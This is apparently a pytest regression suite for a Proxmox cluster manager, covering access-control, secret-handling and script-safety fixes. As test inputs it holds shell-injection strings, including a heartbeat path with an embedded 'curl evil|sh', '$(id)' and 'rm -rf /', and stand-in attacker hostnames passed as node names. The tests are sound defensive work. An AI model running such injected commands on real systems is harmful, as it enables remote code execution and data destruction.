"""Round-10 regression guards.

Every case here is a bug I introduced during this audit campaign, found by auditing my own
diff. The pattern in four of the five is the same: a gate that is correct for a CONFINED caller
applied unconditionally, so it also denies the unconfined operator whose job that route is.
The write gate and the read filter are not interchangeable — that lesson is now in three files.
"""
import time

import pegaprox.utils.rbac as rbac


def _pool_membership(cluster_id, mapping):
    data = {f"{vmid}:{vtype}": pool for vmid, (vtype, pool) in mapping.items()}
    with rbac._pool_cache_lock:
        rbac._pool_membership_cache[cluster_id] = {
            'data': data, 'timestamp': time.time(), 'refreshing': False}


def _cluster(api, cid='cluster_1'):
    m = api.make_fake_manager(cluster_id=cid)
    m.is_connected = True
    return api.set_manager(cid, m)


def _backup_mgr(api, job):
    import types
    m = _cluster(api)
    sess = m._create_session.return_value
    sess.get.return_value = types.SimpleNamespace(status_code=200, text='', json=lambda: {'data': job})
    sess.delete.return_value = types.SimpleNamespace(status_code=200, text='', json=lambda: {'data': None})
    return m


# ── R1: delete_backup_job reused the WRITE gate unconditionally ──────────────
def test_unconfined_tenant_admin_can_delete_the_clusterwide_backup_job(api, seed):
    # PVE creates an all=1 job by default. _authz_backup_targets rejects all=1 for anyone who
    # is not a global admin, so applying it unconditionally locked the owning tenant's admin
    # out of their own default job.
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('tadmin', role='user', tenant_id='acme',
                  permissions=['backup.delete', 'backup.view', 'cluster.view'])
    _backup_mgr(api, {'id': 'job-all', 'all': 1, 'schedule': 'daily'})
    r = api.as_user(u).delete('/api/clusters/cluster_1/datacenter/backup/job-all')
    assert r.status_code == 200, r.get_data(as_text=True)


def test_backup_operator_without_vm_backup_can_still_delete(api, seed):
    # the backup_operator template holds backup.delete but NOT vm.backup, so the per-VM loop
    # inside the write gate refused it every single job
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('bkop', role='user', tenant_id='acme',
                  permissions=['backup.delete', 'backup.view', 'cluster.view', 'vm.view'])
    _backup_mgr(api, {'id': 'job-1', 'vmid': '100', 'schedule': 'daily'})
    r = api.as_user(u).delete('/api/clusters/cluster_1/datacenter/backup/job-1')
    assert r.status_code == 200, r.get_data(as_text=True)


def test_scoped_caller_still_cannot_delete_a_foreign_backup_job(api, seed):
    # ...and the actual security property still holds
    seed.tenant('tenant_x', clusters=['cluster_1'])
    u = seed.user('mallory', role='viewer', tenant_id='tenant_x',
                  permissions=['backup.delete', 'cluster.view', 'vm.backup'])
    seed.pool('cluster_1', 'pool_1', 'mallory', ['pool.view', 'vm.view', 'vm.backup'])
    _pool_membership('cluster_1', {100: ('qemu', 'pool_1')})
    _backup_mgr(api, {'id': 'job-f', 'vmid': '200', 'schedule': 'daily'})
    assert api.as_user(u).delete(
        '/api/clusters/cluster_1/datacenter/backup/job-f').status_code == 403


# ── R2: update_tenant denied on key presence, and the form always sends it ───
def test_tenant_delegate_can_rename_while_resending_the_same_clusters(api, seed):
    # the edit form posts the whole object, clusters included — an unchanged list must not 403
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('gm', role='user', tenant_id='acme',
                  permissions=['admin.tenants', 'cluster.view'])
    r = api.as_user(u).put('/api/tenants/acme',
                           json={'name': 'Acme GmbH', 'clusters': ['cluster_1'],
                                 'quota_max_vms': 50})
    assert r.status_code == 200, r.get_data(as_text=True)


def test_tenant_delegate_still_cannot_actually_change_the_cluster_list(api, seed):
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('gm2', role='user', tenant_id='acme',
                  permissions=['admin.tenants', 'cluster.view'])
    r = api.as_user(u).put('/api/tenants/acme',
                           json={'name': 'Acme', 'clusters': ['cluster_1', 'cluster_secret']})
    assert r.status_code == 403, r.get_data(as_text=True)


# ── R3: the published effective_role collapsed a custom token role ───────────
def test_custom_token_role_keeps_its_name_in_the_session(api, seed, monkeypatch):
    from pegaprox.utils.auth import create_api_token
    import pegaprox.utils.rbac as rbacmod
    seed.tenant('acme', clusters=['cluster_1'])
    seed.user('owner', role='user', tenant_id='acme')
    monkeypatch.setattr(rbacmod, 'get_custom_roles',
                        lambda: {'global': {'readonly': {'permissions': ['vm.view', 'cluster.view']}},
                                 'tenants': {}})
    res = create_api_token('owner', 'ci', role='readonly')
    assert res.get('success'), res
    m = _cluster(api)
    m.last_migration_log = []
    seen = {}
    from pegaprox.api import clusters as clusters_mod
    orig = clusters_mod.check_cluster_access

    def _spy(cid):
        from flask import request
        seen['eff'] = request.session.get('effective_role')
        return orig(cid)

    clusters_mod.check_cluster_access = _spy
    try:
        api.anon().get('/api/clusters/cluster_1/migrations',
                       headers={'Authorization': f"Bearer {res['token']}"})
    finally:
        clusters_mod.check_cluster_access = orig
    # build_authz_user keeps the custom name; the session must agree with it, not collapse to viewer
    assert seen.get('eff') == 'readonly', seen


# ── R4: the secret sweep ate the token IDENTIFIER, not just the secret ───────
def test_backup_sweep_keeps_the_token_username():
    from pegaprox.api.settings import _strip_secret_fields
    c = {'id': 'c1', 'host': 'h', 'api_token_user': 'root@pam!pegaprox',
         'api_token_secret': 'SECRET', 'pass': 'ROOTPW'}
    _strip_secret_fields(c)
    assert c['api_token_user'] == 'root@pam!pegaprox', "the token username is not a secret"
    assert 'api_token_secret' not in c and 'pass' not in c, c


# ── R5: the force-check filter keyed on a field nothing writes ───────────────
def test_force_check_filter_resolves_the_cluster_from_the_config(api, seed, monkeypatch):
    # _record_eval snapshots ts/alert_id/reason/triggered/current_value — never 'cluster' —
    # so the first filter matched nothing and returned an empty map to every scoped caller
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('alertadmin', role='user', tenant_id='acme',
                  permissions=['alert.manage', 'cluster.view'])
    _cluster(api)
    import pegaprox.background.alerts as A
    monkeypatch.setattr(A, 'check_and_send_alerts', lambda: None)
    monkeypatch.setattr(A, 'load_alerts_config', lambda: {'alerts': [
        {'id': 'a-mine', 'cluster_id': 'cluster_1'},
        {'id': 'a-foreign', 'cluster_id': 'cluster_far'}]})
    monkeypatch.setattr(A, '_last_eval', {
        'a-mine': {'ts': 1, 'alert_id': 'a-mine', 'triggered': True},
        'a-foreign': {'ts': 1, 'alert_id': 'a-foreign', 'triggered': True}})
    body = api.as_user(u).post('/api/alerts/force-check').get_json()
    assert list(body['evaluations']) == ['a-mine'], body


# ── the round's sharpest NEW finding: <node> used as an SSH host ─────────────
def test_unknown_node_name_is_never_dialled_as_a_host(api, seed):
    """`_get_node_ip(node) or node` fell back to the caller's own string, so an unresolvable
    node name became the SSH target — and _ssh_connect presents the cluster's STORED
    credentials. Reachable at node.view, a builtin ROLE_USER and ROLE_VIEWER permission."""
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('viewer1', role='viewer', tenant_id='acme',
                  permissions=['node.view', 'cluster.view'])
    m = _cluster(api)
    m.nodes = {'n1': {'node': 'n1', 'status': 'online'}}
    m._get_node_ip.return_value = None          # not a member -> unresolvable
    # drive the real resolver rather than the fake's auto-attribute, which is truthy
    from pegaprox.core.manager import PegaProxManager
    m.member_node_ip.side_effect = lambda n: PegaProxManager.member_node_ip(m, n)
    called = []
    m._ssh_connect.side_effect = lambda host, *a, **k: called.append(host)
    api.as_user(u).get('/api/clusters/cluster_1/nodes/attacker.example.com/multipath')
    assert called == [], f"SSH was attempted against {called}"


def test_member_node_ip_refuses_a_non_member(api, seed):
    from unittest.mock import MagicMock
    from pegaprox.core.manager import PegaProxManager
    mgr = MagicMock(spec=PegaProxManager)
    mgr.nodes = {'n1': {}, 'n2': {}}
    mgr.logger = MagicMock()
    mgr._get_node_ip.return_value = '10.0.0.9'
    assert PegaProxManager.member_node_ip(mgr, 'evil.example.com') is None
    assert PegaProxManager.member_node_ip(mgr, '') is None
    assert PegaProxManager.member_node_ip(mgr, 'n1') == '10.0.0.9'


# ── a config value must never become code in a root-run agent script ────────
def test_ha_heartbeat_path_rejects_a_shell_breakout(api, seed):
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('haadmin', role='admin', tenant_id='acme')
    m = _cluster(api)
    m.ha_config = {}
    r = api.as_user(u).put('/api/clusters/cluster_1/ha/config',
                           json={'storage_heartbeat_path': '/mnt/x"; curl evil|sh; #'})
    assert r.status_code == 400, r.get_data(as_text=True)


def test_ha_heartbeat_path_accepts_normal_paths():
    # the route test above proves the guard is wired; this pins the accept/reject boundary
    # itself, so the guard cannot be tightened into rejecting real heartbeat paths
    import re
    ok = re.compile(r'/[A-Za-z0-9._@/+-]{0,255}')
    for good in ('/mnt/pve/shared-hb', '/srv/hb', '/mnt/pve/nfs-store/ha_heartbeat',
                 '/mnt/pve/store-01/hb.d', '/'):
        assert re.fullmatch(ok, good), good
    for bad in ('/mnt/x"; curl evil|sh; #', '/mnt/$(id)', '/mnt/`id`', 'relative/path',
                '/mnt/x\nrm -rf /'):
        assert not re.fullmatch(ok, bad), bad


# ── plugins: the fix was applied to one handler and its siblings were missed ──
def test_portal_handlers_build_a_floored_identity(api, seed):
    """_ct_create_options used build_authz_user with a comment explaining why; five siblings in
    the same file kept the raw load_users() lookup, so an admin-owned viewer token reached
    user_can_access_vm with its owner's admin role."""
    import re
    src = open('plugins/client_portal/__init__.py').read()
    # no handler may take its authz identity from a raw users-dict lookup any more
    assert not re.search(r'^\s+user = users\.get\(username', src, re.M), \
        "a portal handler still builds its identity from a raw load_users() record"


def test_plugin_admin_checks_use_the_effective_role():
    for p in ('plugins/status_page/__init__.py', 'plugins/notifications/__init__.py'):
        src = open(p).read()
        assert 'effective_role' in src, f"{p} still gates on the stored role"


# ── X-Forwarded-For: the leftmost hop is whatever the client sent ────────────
def test_client_ip_takes_the_rightmost_untrusted_hop(api):
    from pegaprox.utils.audit import get_client_ip
    import pegaprox.utils.audit as auditmod
    with api.app.test_request_context(
            '/', headers={'X-Forwarded-For': '1.2.3.4, 203.0.113.9'},
            environ_base={'REMOTE_ADDR': '127.0.0.1'}):
        # 127.0.0.1 is a trusted proxy, so the header is honoured — but the client-supplied
        # leftmost entry must not win the bucket key
        assert get_client_ip() == '203.0.113.9'


def test_client_ip_single_entry_still_works(api):
    from pegaprox.utils.audit import get_client_ip
    with api.app.test_request_context(
            '/', headers={'X-Forwarded-For': '203.0.113.9'},
            environ_base={'REMOTE_ADDR': '127.0.0.1'}):
        assert get_client_ip() == '203.0.113.9'


def test_client_ip_ignores_the_header_from_an_untrusted_peer(api):
    from pegaprox.utils.audit import get_client_ip
    with api.app.test_request_context(
            '/', headers={'X-Forwarded-For': '1.2.3.4'},
            environ_base={'REMOTE_ADDR': '198.51.100.7'}):
        assert get_client_ip() == '198.51.100.7'


# ── cross-cluster replication clones a guest to another cluster ──────────────
def test_cross_cluster_replication_gates_the_source_guest(api, seed):
    seed.tenant('tenant_x', clusters=['cluster_1', 'cluster_2'])
    u = seed.user('xrepl', role='viewer', tenant_id='tenant_x',
                  permissions=['cluster.config', 'cluster.view'])
    seed.pool('cluster_1', 'pool_1', 'xrepl', ['pool.view', 'vm.view'])
    _pool_membership('cluster_1', {100: ('qemu', 'pool_1')})
    _cluster(api, 'cluster_1')
    _cluster(api, 'cluster_2')
    r = api.as_user(u).post('/api/cross-cluster-replications',
                            json={'source_cluster': 'cluster_1', 'target_cluster': 'cluster_2',
                                  'vmid': 300, 'target_node': 'n1'})
    assert r.status_code == 403, r.get_data(as_text=True)


# ── V2P: the copy reported success after copying nothing ────────────────────
def test_v2p_parallel_copy_script_propagates_failure():
    """Each stream is a pipeline (ssh | dd) backgrounded with &, and the script used to end in
    a bare `wait` — which returns 0 no matter how the children exited. A disk that copied zero
    bytes was therefore reported as a completed migration. Assert the generated shape, and
    prove the shape itself by running it."""
    import subprocess
    src = open('pegaprox/core/v2p.py').read()
    assert '"set -o pipefail",' in src, "pipeline status is still masked"
    assert 'for p in $pids; do wait "$p" || rc=1; done' in src, "still waiting without status"
    assert "lines.append('exit $rc')" in src, "the script still cannot fail"

    # the old shape, for contrast
    old = subprocess.run(['bash', '-c', '( false | cat ) & ( false | cat ) & wait'],
                         capture_output=True)
    assert old.returncode == 0, "sanity: the old shape really did mask failure"

    new_fail = subprocess.run(['bash', '-c',
        'set -o pipefail; pids=""; ( false | cat ) & pids="$pids $!"; '
        '( false | cat ) & pids="$pids $!"; rc=0; '
        'for p in $pids; do wait "$p" || rc=1; done; exit $rc'], capture_output=True)
    assert new_fail.returncode == 1, "a failed stream must fail the script"

    new_ok = subprocess.run(['bash', '-c',
        'set -o pipefail; pids=""; ( true | cat ) & pids="$pids $!"; rc=0; '
        'for p in $pids; do wait "$p" || rc=1; done; exit $rc'], capture_output=True)
    assert new_ok.returncode == 0, "a clean run must still succeed"


def test_v2p_ssh_options_have_a_separator():
    """`"-o StrictHostKeyChecking=accept-new"` implicitly concatenated with the next line's
    `"-o ServerAliveInterval=..."` produced the literal option value `accept-new-o`, which ssh
    rejects with exit 255 — so these transfer paths could not connect at all."""
    src = open('pegaprox/core/v2p.py').read()
    assert 'accept-new"\n' not in src, "an ssh option string is still missing its separator"
    assert 'accept-new-o' not in src


def test_v2p_helper_scripts_are_not_world_readable():
    """The generated scripts embed SSHPASS=<esxi root password> and were created with the
    default umask, so the credential sat world-readable in /tmp on the Proxmox node for the
    whole transfer."""
    src = open('pegaprox/core/v2p.py').read()
    assert 'chmod +x {script}' not in src, "a helper script is still created world-readable"
    assert src.count('umask 077') >= 3
